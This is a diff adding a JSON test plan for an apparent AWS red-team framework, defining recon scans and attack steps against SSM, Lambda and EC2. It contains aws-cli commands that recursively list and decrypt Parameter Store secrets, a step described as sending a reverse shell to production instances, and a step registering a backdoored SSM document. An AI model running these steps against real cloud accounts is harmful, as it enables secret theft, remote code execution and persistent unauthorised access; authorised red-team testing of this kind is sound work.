@@ -1,0 +1,201 @@
+{
+  "code": "TP-AWS-RED-MEGA-003",
+  "name": "Mega-Structure AWS Red Team Operation (v3 - SSM Added)",
+  "description": "The complete Red Team framework. Includes Global OSINT (3 tests), Lambda (2 tests), EC2 (1 test), and NEW SSM exploitation vectors.",
+  "test_cases": [
+    {
+      "code": "AWS-OSINT-GLOBAL",
+      "name": "Global Attacker Recon",
+      "execution_mode": "once",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "device",
+            "name": "attacker",
+            "where": { "hostname": "attacker_machine" }
+          }
+        ]
+      },
+      "steps": [{ "title": "Run Nuclei", "tool": "nuclei", "action": "scan" }]
+    },
+    {
+      "code": "AWS-AUDIT-PROWLER",
+      "name": "Global Prowler Audit",
+      "execution_mode": "once",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "device",
+            "name": "attacker",
+            "where": { "hostname": "attacker_machine" }
+          }
+        ]
+      },
+      "steps": [{ "title": "Run Prowler", "tool": "prowler", "action": "scan" }]
+    },
+    {
+      "code": "AWS-AUDIT-SCOUT",
+      "name": "Global ScoutSuite Audit",
+      "execution_mode": "once",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "device",
+            "name": "attacker",
+            "where": { "hostname": "attacker_machine" }
+          }
+        ]
+      },
+      "steps": [
+        { "title": "Run ScoutSuite", "tool": "scoutsuite", "action": "scan" }
+      ]
+    },
+    {
+      "code": "AWS-SSM-SECRETS-001",
+      "name": "SSM Parameter Store Harvesting",
+      "description": "Iterate through Parameter Store to find and decrypt secrets (DB keys, API tokens).",
+      "execution_mode": "per_binding",
+      "execution_binding": "ssm_svc",
+      "target_scope": {
+        "tags": ["ssm", "secrets"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ssm_svc",
+            "cardinality": "many",
+            "where": { "service_type": "ssm" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Enumerate Parameters",
+          "description": "Recursive listing of parameters.",
+          "tool": "aws-cli",
+          "action": "execute",
+          "arguments": ["ssm get-parameters-by-path --path / --recursive"]
+        },
+        {
+          "title": "Decrypt SecureStrings",
+          "description": "Attempt decryption of identified secrets.",
+          "tool": "aws-cli",
+          "action": "execute",
+          "arguments": ["ssm get-parameter --name <PARAM> --with-decryption"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-SSM-RCE-001",
+      "name": "SSM RunCommand Lateral Movement",
+      "description": "Abuse 'ssm:SendCommand' to execute shell commands on managed EC2 instances.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ssm_svc",
+      "target_scope": {
+        "tags": ["ssm", "rce"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ssm_svc",
+            "cardinality": "many",
+            "where": { "service_type": "ssm" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Execute Reverse Shell",
+          "description": "Send a bash reverse shell payload to all targets.",
+          "tool": "aws-cli",
+          "action": "execute",
+          "arguments": [
+            "ssm send-command --document-name AWS-RunShellScript --targets Key=tag:Env,Values=Prod"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-SSM-DOC-001",
+      "name": "SSM Document Backdooring",
+      "description": "Create or modify SSM Documents to persist access via shared automation.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ssm_svc",
+      "target_scope": {
+        "tags": ["ssm", "persistence"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ssm_svc",
+            "cardinality": "many",
+            "where": { "service_type": "ssm" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Create Malicious Document",
+          "description": "Register a new document containing a backdoor user creation script.",
+          "tool": "aws-cli",
+          "action": "execute",
+          "arguments": ["ssm create-document --content file://backdoor.json"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-LAMBDA-URL-001",
+      "name": "Lambda Function URL Scan",
+      "execution_mode": "per_binding",
+      "execution_binding": "lambda_svc",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "lambda_svc",
+            "cardinality": "many",
+            "where": { "service_type": "lambda" }
+          }
+        ]
+      },
+      "steps": [
+        { "title": "Check Auth", "tool": "aws-cli", "action": "execute" }
+      ]
+    },
+    {
+      "code": "AWS-LAMBDA-ENV-001",
+      "name": "Lambda Env Var Harvesting",
+      "execution_mode": "per_binding",
+      "execution_binding": "lambda_svc",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "lambda_svc",
+            "cardinality": "many",
+            "where": { "service_type": "lambda" }
+          }
+        ]
+      },
+      "steps": [
+        { "title": "Get Config", "tool": "aws-cli", "action": "execute" }
+      ]
+    },
+    {
+      "code": "AWS-EC2-IMDS-001",
+      "name": "EC2 IMDSv1 Exploitation",
+      "execution_mode": "per_binding",
+      "execution_binding": "ec2_inst",
+      "target_scope": {
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ec2_inst",
+            "cardinality": "many",
+            "where": { "service_type": "ec2" }
+          }
+        ]
+      },
+      "steps": [
+        { "title": "Curl Meta-Data", "tool": "curl", "action": "execute" }
+      ]
+    }
+  ]
+}
